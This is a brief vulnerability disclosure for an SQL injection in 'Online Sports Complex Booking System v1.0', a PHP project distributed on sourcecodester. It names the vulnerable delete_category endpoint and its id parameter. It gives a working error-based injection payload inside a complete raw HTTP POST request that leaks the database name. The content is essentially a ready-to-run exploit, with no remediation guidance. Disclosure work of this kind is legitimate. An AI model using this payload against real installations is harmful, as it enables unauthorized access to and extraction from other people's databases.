# Online Sports Complex Booking System v1.0 by oretnom23 has SQL injection

vendors: https://www.sourcecodester.com/php/15236/online-sports-complex-booking-system-phpmysql-free-source-code.html

Vulnerability File: \scbs\classes\Master.php?f=delete_category

Vulnerability location: /scbs/classes/Master.php?f=delete_category, id

[+] Payload: id=2' and updatexml(1,concat(0x7e,(select database()),0x7e),0)--+

```sql
POST /scbs/classes/Master.php?f=delete_category HTTP/1.1
Host: 192.168.1.19
Content-Length: 65
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.1.19
Referer: http://192.168.1.19/scbs/admin/?page=categories
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=p5eujbkhl692v4hpr6ltptnq06
Connection: close

id=2' and updatexml(1,concat(0x7e,(select database()),0x7e),0)--+ // Leak place ---> id
```

![image](https://user-images.githubusercontent.com/54017627/165212872-88cc3654-70fb-4714-ae1d-247507812536.png)


